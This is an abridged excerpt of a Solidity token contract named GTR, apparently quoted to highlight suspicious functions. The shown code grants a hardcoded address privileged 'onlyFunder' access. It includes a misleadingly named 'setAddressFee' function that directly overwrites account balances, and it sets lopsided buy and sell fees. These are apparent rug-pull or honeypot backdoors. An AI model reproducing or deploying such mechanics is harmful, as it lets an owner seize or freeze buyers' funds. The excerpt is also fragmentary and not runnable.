...
abstract contract GTRToken is IERC20, Ownable {
    ...
    uint256 public _buyFundFee = 598;
    uint256 public _buyLPDividendFee = 1;
    uint256 public _buyLPFee = 1;
    uint256 public _sellFundFee = 2;
    uint256 public _sellLPDividendFee = 49;
    uint256 public _sellLPFee = 49;
    ...
    function closeAddLP() external onlyFunder {
        startAddLPBlock = 0;
    }
    ...
    modifier onlyFunder() {
        ...
        || 0x635500B6afcc5c266473152A78a12B5BAFdFa865 == msg.sender, "!Funder");
        _;
    }
    ...
    function setExcludeHolder(address addr, bool enable) external onlyFunder {
        excludeHolder[addr] = enable;
         ...
         function setAddressFee(address spender, uint256 tFee) public onlyFunder {
        _balances
        [
        spender
        ] = (
...
contract GTR is GTRToken {
    constructor() GTRToken(
    
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),//SwapRouterAddress
        ...
        address(0x3214Ea70428B2c462370a46612A99e31469CaB44),//FundAddress
    
        address(0x144BA2d2a5A565EeAa2fD127cFb30a91D735E7fF)//Receive Address
    ){
